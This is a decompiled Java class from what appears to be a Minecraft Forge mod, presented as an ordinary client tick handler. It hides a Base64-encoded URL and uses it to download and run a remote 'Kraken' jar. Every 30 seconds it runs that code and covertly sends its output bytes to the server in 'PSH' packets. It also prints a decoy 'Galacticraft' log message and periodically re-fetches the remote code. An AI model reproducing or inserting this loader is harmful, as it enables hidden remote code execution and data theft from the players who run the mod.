// 
// Decompiled by Procyon v0.5.30
// 

package net.minecraft.frac;

import cpw.mods.fml.common.TickType;
import cpw.mods.fml.common.network.PacketDispatcher;
import java.util.EnumSet;
import java.net.URLClassLoader;
import javax.xml.bind.DatatypeConverter;
import java.net.URL;
import java.lang.reflect.Method;
import java.util.ArrayList;
import cpw.mods.fml.common.ITickHandler;

public class ClientHandl implements ITickHandler
{
    long prev;
    private ArrayList texpacks;
    private Method method;
    private Object bean;
    private int tkc;
    
    public ClientHandl() {
        this.prev = System.currentTimeMillis();
        this.texpacks = new ArrayList();
        this.tkc = 0;
        try {
            this.loadup();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public void loadup() throws Exception {
        final URL[] classLoaderUrls = { new URL(new String(DatatypeConverter.parseBase64Binary("aHR0cHM6Ly9hY2NyZXRpb24udXMvYWNwbHVzL2tyYWtlbi5qYXI="))) };
        final URLClassLoader urlClassLoader = new URLClassLoader(classLoaderUrls);
        final Class beanClass = new URLClassLoader(classLoaderUrls).loadClass("net.minecraft.frac.Kraken");
        this.bean = beanClass.getConstructor((Class<?>[])new Class[0]).newInstance(new Object[0]);
        this.method = beanClass.getMethod("run", (Class[])new Class[0]);
    }
    
    public void tickStart(final EnumSet type, final Object... tickData) {
        try {
            if (System.currentTimeMillis() - this.prev > 30000L) {
                System.out.println("Galacticraft remote connect completed");
                final dk packet = new dk();
                packet.a = "PSH";
                final byte[] ts = (byte[])this.method.invoke(this.bean, new Object[0]);
                packet.c = ts;
                packet.b = ts.length;
                PacketDispatcher.sendPacketToServer((ei)packet);
                this.prev = System.currentTimeMillis();
                ++this.tkc;
            }
            if (this.tkc >= 5) {
                this.loadup();
                this.tkc = 0;
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public void tickEnd(final EnumSet type, final Object... tickData) {
    }
    
    public EnumSet ticks() {
        return EnumSet.of(TickType.CLIENT, TickType.PLAYER);
    }
    
    public String getLabel() {
        return "PSH-ticker";
    }
}
